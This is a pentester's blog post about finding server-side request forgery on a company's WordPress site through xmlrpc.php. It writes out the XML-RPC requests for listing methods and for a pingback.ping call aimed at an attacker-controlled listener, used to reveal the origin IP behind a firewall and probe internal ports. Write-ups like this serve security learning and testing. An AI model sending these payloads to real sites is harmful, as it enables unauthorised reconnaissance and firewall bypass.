---
title: How I Hacked A Billion Dollar Company :D
published: true
---
Hi Hackers, Today article is about how i hacked into a Billion dollar company i.e. SSRF via xmlrpc.php. I always wanted to find an SSRF in a website who knew i would find it during my pentest. I wouldn't disclose the company name so lets just call it redacted (Ofcourse :p).

I was assigned a task to pentest this company and i was issued a url https://redacted.com. I did how normally a web penetration testing goes, running my bash one-liners in order to get the subdomains and then running paramspider in order to get the parameters etc. Usually when i hunt for bugs, i go for targeting the subdomains because they are more vulnerable and ofcourse a less travelled path is more vulnerable. However the application itself was very strong and very hard to exploit. It took me days and i was suffering from burnouts. Until i found that the main domain which only consists of company blogs is running on wordpress. The first idea i got was i should run WPScan and i found that the version they are running on is old. I was like finally.
<p align="center">
  <img src="https://raw.githubusercontent.com/Saad-20/Blog/master/assets/hacked_Billion_Dollar_Company/Yes_image.jpg"/>
</p>
I went to the main domain and entered the url path of xmlrpc.php to see if it is leaking and YES IT WAS :D.   
But what is xmlrpc.php?   
XML-RPC aka is a XML remote procedure call protocol which encodes its calls.In short form, it is a file which is used for pulling POST data from a website using RPC.In a wordpress application, it is an API which allows the developers in order to manipulate the wordpress website for instance publishing a post, Editing a post, deleting or even to upload files.   
Anyways, i fired up my burp in order to intercept the request of the url. The url was **https://redacted.com/xmlrpc.php**.   
1) As soon as i intercepted the request, i send it to repeater and changed the request from GET to POST because xmlrpc only accepts POST request   
2) We need to fetch the list of methods in order to know which methods are available for a potential attack. I was mainly looking for pingback.ping method if it is available as that would lead me to a potential SSRF. I added the following code in the POST request in order to list the methods. 
```<methodCall>```   
```<methodName>system.listMethods</methodName>```   
```<params></params>```   
```</methodCall>```      
<p align="center">   
  <img src="https://raw.githubusercontent.com/Saad-20/Blog/master/assets/hacked_Billion_Dollar_Company/ssrf_1.jpg">
</p>       
3) From the screenshot above, we can see pingback.ping function is available. This could allow an attacker to initiate a request from the wordpress site to an arbitrary site. With pingback.ping function, we could abuse the system to diclose the real IP of the application that is sitting behind the WAF thus also bypassing firewall.
Thus with SSRF via pingback.ping function, we could scan the internal network to check which ports are open and directly attack the internal network. The following code was used in order to get the ping back to our server     
```<methodCall>```   
```<methodName>pingback.ping</methodName>```
```<params><param>```   
```<value><string>http://<YOUR SERVER>:<port></string></value>```   
```</param><param>```   
```<value><string>http://redacted.com/business/<string></value>```   
```</param></params>```      
```</methodCall>```   
Where the "YOUR SERVER" is the ip address of the attacker server and "port" is the port of the attacker server that is listening on. The "http://redacted.com/business" is the valid blog that is linked to the target application. I used pingb.in as my server in order to check the logs
<p align="center">
 <img src="https://raw.githubusercontent.com/Saad-20/Blog/master/assets/hacked_Billion_Dollar_Company/ssrf_2.jpg"/>
</p>   
4) We then send the modified request to the target application. However, if the value is greater than 0 then the port is open. Looking at the server side, we see numerous IP addresses that were disclosed that belonged to the target Application. Thus bypassing all security mechanisms and being exposed to an attack
<p align="center">
 <img src="https://raw.githubusercontent.com/Saad-20/Blog/master/assets/hacked_Billion_Dollar_Company/ssrf_3.jpg">
</p>

